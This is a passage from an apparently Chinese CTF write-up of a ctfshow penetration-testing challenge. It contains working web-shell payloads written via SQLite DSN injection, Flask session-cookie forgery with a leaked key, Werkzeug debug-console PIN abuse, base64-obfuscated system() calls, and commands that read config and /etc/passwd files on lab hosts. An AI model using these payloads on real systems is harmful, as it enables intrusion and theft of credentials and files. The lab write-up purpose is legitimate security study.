class="line">sqlite</span><br></pre></td></tr></table></figure><p>sqlite和mysql等还是有些区别的，sqlite的每一个数据库就是一个文件。</p><p>先创建一个users表，包含字段name，利用PDO连接数据库的dsn，并将数据库文件命名为1.php:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?username=1&amp;password=1&amp;query=CREATE TABLE users (name TEXT);&amp;dsn=sqlite:1.php</span><br></pre></td></tr></table></figure><p>尝试写马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?username=1&amp;password=1&amp;query=INSERT INTO users (name) VALUES (&#x27;&lt;?php file_put_contents(&quot;cmd.php&quot;,&quot;&lt;?php system(\$_GET[0]);?&gt;&quot;);?&gt;&#x27;);&amp;dsn=sqlite:1.php</span><br></pre></td></tr></table></figure><blockquote><p>建议在burp上进行</p></blockquote><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-212120.png"></p><p>再访问1.php执行马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/1.php</span><br><span class="line">/cmd.php?0=cat config.php</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-212458.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//数据库连接配置</span></span><br><span class="line"><span class="variable">$database_host</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$database_user</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$database_password</span> = <span class="string">&quot;3f7a1d5a-d55d-4d9d-8d9a-d5d5d5d5d5d5&quot;</span>;</span><br><span class="line"><span class="variable">$database_name</span> = <span class="string">&quot;web_db_2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pdo</span> =<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dsn</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;dsn&#x27;</span>];</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$dsn</span> &amp;&amp; <span class="variable">$username</span> &amp;&amp; <span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$pdo</span> = <span class="title function_ invoke__">pdo_init</span>(<span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pdo</span> === <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;database init faild&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">setAttribute</span>(PDO::<span class="variable constant_">ATTR_ERRMODE</span>, PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>);</span><br><span class="line">        <span class="variable">$sql</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;query&#x27;</span>];</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="title function_ invoke__">pdo_query</span>(<span class="variable">$pdo</span>, <span class="variable">$sql</span>);</span><br><span class="line">        <span class="title function_ invoke__">pdo_close</span>(<span class="variable">$pdo</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$stmt</span>!==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;database test success&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;database test error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pdo_init</span>(<span class="params"><span class="variable">$dns</span>, <span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dns</span>,<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$pdo</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(PDOException <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;数据库连接失败：&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pdo_query</span>(<span class="params"><span class="variable">$pdo</span>, <span class="variable">$sql</span>, <span class="variable">$params</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$params</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$stmt</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(PDOException <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;数据库操作失败：&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pdo_close</span>(<span class="params"><span class="variable">$pdo</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$pdo</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>flag7：ctfshow&#123;3f7a1d5a-d55d-4d9d-8d9a-d5d5d5d5d5d5&#125;</code></p><h4 id="邮箱迷云"><a href="#邮箱迷云" class="headerlink" title="邮箱迷云"></a>邮箱迷云</h4><p>要求<strong>提交park在2024年12月27日19时20分收到的邮件中的数字</strong></p><p>通过上传的马执行RCE我们发现根目录下有个secret.txt文件：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-215248.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YUdGamEyVnlYMk4wWm5Ob2IzZEFNVFl6TG1OdmJTOUk=</span><br><span class="line">WVdOclpYSmZZM1JtYzJnd2R3PT0=</span><br></pre></td></tr></table></figure><p>分别base64解码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGFja2VyX2N0ZnNob3dAMTYzLmNvbS9I</span><br><span class="line">YWNrZXJfY3Rmc2gwdw==</span><br></pre></td></tr></table></figure><p>拼接起来进行base64解码：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-215849.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker_ctfshow@163.com/Hacker_ctfsh0w</span><br></pre></td></tr></table></figure><p>这是163邮箱的账号密码</p><p><code>flag8：ctfshow&#123;hacker_ctfshow@163.com_Hacker_ctfsh0w&#125;</code></p><h3 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h3><h4 id="再下一城"><a href="#再下一城" class="headerlink" title="再下一城"></a>再下一城</h4><p>需要<strong>提交log_server_key.txt内容</strong></p><p>之前的main.py.bak提到了<code>log_server_key.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, session</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> url_for</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> join</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 Flask 应用的密钥，用于加密会话等</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义根路由，处理 GET 请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># 在会话中设置用户为 guest</span></span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log server is running&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查会话中的用户是否为 admin</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;user&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /key 路由，处理 GET 请求，获取特定文件中的密钥</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 尝试打开文件读取密钥</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/log_server_key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: key&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /set_log_option 路由，处理设置日志选项的请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_log_option&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_log_option</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从请求参数中获取日志名称和日志文件名称</span></span><br><span class="line">    logName = request.args.get(<span class="string">&#x27;logName&#x27;</span>)</span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取日志记录器并添加文件处理器</span></span><br><span class="line">    app_log = logging.getLogger(logName)</span><br><span class="line">    app_log.addHandler(logging.FileHandler(<span class="string">&#x27;./log/&#x27;</span> + logFile))</span><br><span class="line">    app_log.setLevel(logging.INFO)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 清空日志文件内容</span></span><br><span class="line">    clear_log_file(<span class="string">&#x27;./log/&#x27;</span> + logFile)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log option set successfully&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /get_log_content 路由，处理获取日志内容的请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_log_content&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_log_content</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从请求参数中获取日志文件名称</span></span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    <span class="comment"># 拼接文件路径</span></span><br><span class="line">    path = join(<span class="string">&#x27;log&#x27;</span>, basename(logFile))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log content&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: content&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空指定文件内容的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_log_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 运行 Flask 应用，开启调试模式，监听所有 IP 地址，端口为 8888</span></span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>而通过爆破可以测出8888端口的flask服务：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-221222.png"></p><p>而访问时发现有cookie：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250228-185100.png"></p><p>毫无疑问<strong>session伪造</strong>了，密钥给了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5</span><br></pre></td></tr></table></figure><p><strong>session伪造工具：<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27; -t &#x27;&#123;&quot;user&quot;:&quot;admin&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250228-190858.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie:session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4</span><br></pre></td></tr></table></figure><p>拿到伪造的cokie后直接访问是不行的，这里需要我们利用之前写的马通过curl命令将cookie带过去：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4&quot;  http://172.2.237.6:8888/key</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250228-193501.png"></p><p><code>flag9：ctfshow&#123;4f5d1d5d-1d5d-1d5d1d5d1d5d&#125;</code></p><h4 id="顺藤摸瓜"><a href="#顺藤摸瓜" class="headerlink" title="顺藤摸瓜"></a>顺藤摸瓜</h4><p>需要<strong>提交flask所在服务器的&#x2F;etc&#x2F;passwd 文件最后一行内容</strong></p><p>main.py.bak可以看到debug为true，或许可以打<strong>pin码泄露</strong>。</p><p>访问<code>/console</code>路由：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250228-200132.png"></p><p>可以看到用了Werkzeug，同时console的key：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">motSXRASEKviSbHLumrO</span><br></pre></td></tr></table></figure><p>下面需要<strong>创建一个日志文件，将pin码打印在文件上</strong></p><p>而设置<strong>loggername为werkzeug记录flask的日志</strong>（可在logdict里看）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4&quot;  &quot;http://172.2.237.6:8888/set_log_option%3flogName=werkzeug%2526logFile=main.log&quot;</span><br></pre></td></tr></table></figure><p>这里可以通过<strong>printpin来泄露pin码</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4&quot;  &quot;http://172.2.237.6:8888/console%3f__debugger__=yes%2526cmd=printpin%2526s=motSXRASEKviSbHLumrO&quot;</span><br></pre></td></tr></table></figure><p>查看我们的日志文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4&quot;  &quot;http://172.2.237.6:8888/get_log_content?logFile=main.log&quot;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250228-205814.png"></p><p>拿到pin码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">834-059-141</span><br></pre></td></tr></table></figure><p>然后用<strong>pin码进行验证</strong>，将cookie保存在本地：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=curl -c 1.txt -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4&quot;  &quot;http://172.2.237.6:8888/console%3f__debugger__=yes%2526cmd=pinauth%2526pin=834-059-141%2526s=motSXRASEKviSbHLumrO&quot;</span><br></pre></td></tr></table></figure><p>访问1.txt拿到cookie:</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250228-210546.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__wzd1bb8000fe86a8d35ba90=1740747901|f92113889b49</span><br></pre></td></tr></table></figure><p>利用cookie去进行RCE，这里直接读：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=curl  -v -b  <span class="string">&quot;__wzd1bb8000fe86a8d35ba90=1740747901|f92113889b49&quot;</span>  <span class="string">&quot;http://172.2.237.6:8888/console?__debugger__=yes&amp;cmd=print(__import__(&#x27;os&#x27;).popen(&#x27;cat%20\/etc\/passwd&#x27;).read())&amp;frm=0&amp;s=motSXRASEKviSbHLumrO&quot;</span></span><br></pre></td></tr></table></figure><p>这里不知道为什么执行不了，我就将cmd.php里的system改成eval了</p><p>重新进行rce:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=system(base64_decode(<span class="string">&#x27;Y3VybCAgLXYgLWIgICJfX3d6ZDFiYjgwMDBmZTg2YThkMzViYTkwPTE3NDA3NDc5MDF8ZjkyMTEzODg5YjQ5IiAgImh0dHA6Ly8xNzIuMi4yMzcuNjo4ODg4L2NvbnNvbGU/X19kZWJ1Z2dlcl9fPXllcyZjbWQ9cHJpbnQoX19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0JTIwXC9ldGNcL3Bhc3N3ZCcpLnJlYWQoKSkmZnJtPTAmcz1tb3RTWFJBU0VLdmlTYkhMdW1yTyI=&#x27;</span>));</span><br><span class="line"></span><br><span class="line">//curl  -v -b  <span class="string">&quot;__wzd1bb8000fe86a8d35ba90=1740747901|f92113889b49&quot;</span>  <span class="string">&quot;http://172.2.237.6:8888/console?__debugger__=yes&amp;cmd=print(__import__(&#x27;os&#x27;).popen(&#x27;cat%20\/etc\/passwd&#x27;).read())&amp;frm=0&amp;s=motSXRASEKviSbHLumrO&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250228-222730.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">_apt:x:42:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">ctfer:x:1000:1000::/home/ctfer:/bin/bash</span><br></pre></td></tr></table></figure><p>也可以进行外带注入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=system(base64_decode(<span 